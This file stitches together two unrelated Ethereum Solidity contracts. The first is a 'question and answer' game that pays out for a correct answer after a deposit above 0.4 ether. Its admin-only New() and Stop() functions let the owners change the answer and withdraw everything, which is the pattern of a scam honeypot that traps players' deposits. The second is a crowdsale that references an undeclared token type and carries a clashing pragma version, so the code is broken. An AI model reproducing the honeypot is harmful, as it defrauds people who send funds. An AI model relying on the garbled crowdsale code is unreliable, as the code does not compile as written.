pragma solidity ^0.4.25;

contract play_me
{
    function Try(string _response) external payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 0.4 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string _question, string _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] admins) public{
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010; 
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
 }
